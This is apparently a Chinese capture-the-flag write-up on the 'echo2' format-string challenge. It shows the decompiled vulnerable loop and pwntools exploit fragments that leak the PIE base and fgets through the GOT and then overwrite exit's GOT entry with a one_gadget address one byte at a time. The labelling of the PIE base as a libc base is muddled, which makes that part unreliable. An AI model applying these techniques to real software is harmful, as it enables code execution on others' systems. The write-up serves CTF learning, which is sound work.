Ev3r

继承了echo1，来了个echo2，这个题也有格式化字符串漏洞。

Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled

开启了PIE，这题利用起来应该还是格式化字符串。

void __noreturn echo()
{
  char s; // [rsp+0h] [rbp-110h]
  unsigned __int64 v1; // [rsp+108h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  do
  {
    fgets(&s, 256, stdin);
    printf(&s, 256LL);
  }
  while ( strcmp(&s, "exit\n") );
  system("echo Goodbye");
  exit(0);
}

但是有一点不同的是，这个printf后面还有一个256的限制。尝试了一下，是控制输出，256位，也就是说，我们去修改got表的时候如果选择printf，那么就要一次性修改。否则printf函数调用就会错误。所以看了师傅的WP，尝试去修改exit的got。

我个人觉得修改printf是可行的，有时间尝试一下。

这里给一个PIE+fmt的技巧。想要泄露libc基址就需要选择返回到main函数的返回地址进行泄露，然后再减去偏移，实际上main函数的偏移地址就是基址？？？

算了一下，果然就是。

0xa03-74-0x9B9 = 0其实也就是低三位剪掉就行了。

所以泄露libc又多了个fmt的姿势。然后就是利用函数了。由于有个检测exit\n，只要绕过就可以无限次的使用格式化字符串，那么我们首先泄露基址。

偏移(0x110+0x8)/8 + 6就是返回地址了。

payload = '%41$p'
sh.sendline(payload)
libc_base = int(sh.recvuntil('\n',drop = True),base = 16) - 0xa03
print hex(libc_base)

泄露基址之后，可以得到exit的got表地址，fgets的got表地址，等，通过这些got表地址去泄露libc版本。然后就可以把exit的got表劫持为one_gadget（无法控制参数），也可以改为sys之后利用printf看看能不能修改寄存器的值，达到修改参数的目的。

这里顺便学一下libcsearch的使用之前都是去网上的libc库找，这样太不hacker了，所以学一下search的使用

选择泄露fgets函数然后去dump libc，

system_plt_addr = baseAddr + elf.symbols["system"]                                
fgets_got_addr = baseAddr + elf.got["fgets"]                                      
exit_got = baseAddr + elf.got["exit"] 

sh.sendline("stop%8$sdoneaaaa" + p64(fgets_got_addr))

然后dump的时候版本出不来。后来琢磨了一下，加了一行这个。

offset = libc.dump('fgets')就dump出来了。

然后去libc-database里面找相应的libc。然而，没找到，想不明白师傅是怎么直接拿到对应的libc然后one_gadget的。

先不管

我们拿到one_gadget之后，要获得one_gadget的实际地址，那么还需要fgets的实际地址的配合。

execve_addr = fgets_addr - 0x6DAD0 + 0xf02a4                                      
print hex(execve_addr)

0x6dad0是fgets在libc里面的偏移，f02a4是one_gadget的偏移。

最后就是覆盖地址了。这里注意64位，覆写的时候，把地址放在后面，可以避免printf函数被\x00截断

for i in range(0,8):                                                              
    #overwrite execve_addr+i                                                      
    length = execve_addr % 0x100                                                  
    payload = ('%' + str(length) + 'c' + "%8$hhn").ljust(16,'a') + p64(exit_got+i)
    if length == 0:                                                               
        payload = ("%8$hhn").ljust(16,'a') + p64(exit_got+i)                      
    sh.sendline(payload)                                                          
    sh.recvuntil(chr(int(str(hex(exit_got))[2:4],base = 16)))                     
    execve_addr >>= 8
